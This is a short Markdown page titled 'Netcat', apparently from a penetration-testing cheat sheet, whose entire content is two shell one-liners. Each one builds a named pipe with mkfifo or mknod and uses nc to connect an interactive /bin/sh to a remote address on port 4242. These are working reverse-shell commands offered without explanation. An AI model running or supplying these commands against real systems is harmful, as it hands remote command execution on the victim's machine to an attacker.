---
title: "Netcat"
description: ""
summary: ""
date: 2023-09-07T16:06:50+02:00
lastmod: 2023-09-07T16:06:50+02:00
draft: false
weight: 800
toc: true
seo:
  title: "" # custom title (optional)
  description: "" # custom description (recommended)
  canonical: "" # custom canonical URL (optional)
  robots: "" # custom robot tags (optional)
---


```sh
mkfifo /tmp/f;nc 10.8.3.12 4242 0</tmp/f|/bin/sh -i 2>&1|tee /tmp/f
```

```sh
mknod /tmp/f p;nc 10.10.15.18 4242 0</tmp/f|/bin/sh -i 2>&1|tee /tmp/f
```

